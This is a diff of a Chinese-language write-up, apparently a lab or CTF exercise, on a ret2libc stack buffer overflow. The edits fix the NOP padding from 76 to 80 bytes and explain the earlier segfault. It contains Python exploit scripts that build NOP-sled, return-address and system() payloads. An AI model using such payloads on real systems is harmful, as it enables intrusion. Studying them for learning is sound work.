@@ -90,7 +90,7 @@ nop nop + ret + system\(\) +参数
 
 ![](/png/43.png)
 
-76个nop+ ret地址+ system地址+ 环境变量地址
+76个nop+ ret地址+ system地址+ 环境变量地址 （修改应该是80个nop\)
 
 设置环境变量export TTE="whoami"
 
@@ -100,7 +100,7 @@ nop nop + ret + system\(\) +参数
 
 现在所有的要素都有了。
 
-\x90 \*76 + 0x8040617 +0xb7ecffb0 + 0xbfffff47
+\x90 \*80 + 0x8040617 +0xb7ecffb0 + 0xbfffff47
 
 漏洞利用代码编写如下：
 
@@ -108,7 +108,7 @@ exploit.py
 
 \#!/usr/bin/env python
 
-offset = 76
+offset = 76    \(这里不对，应该是80个）
 
 nopsled = "\x90"\*offset
 
@@ -120,13 +120,11 @@ argv\_addr = "\x47\xff\xff\xbf"
 
 print nopsled + "FAKE" +  ret + system + "FAKE" + argv\_addr
 
-执行后，会出现段错误。
+执行后，会出现段错误。后来才发现出错原因是填充字节应该是/80个，少了个字节。80个字节才能正好把ebp覆盖了，后面跟ret地址。
 
 修改代码如下：
 
 \#!/usr/bin/env python
-
-
 
 offset = 0x50
 
@@ -142,17 +140,15 @@ ret2 = "\xc0\x60\xec\xb7"
 
 arg1 = "\x46\xff\xff\xbf"
 
-
-
-
-
 payload = cmd + junk + gadg\_ret + ret1 + ret2 + arg1
-
-
 
 print payload
 
-~               
+~
 
 ![](/png/45.png)
+
+
+
+![](/png/46.png)
 
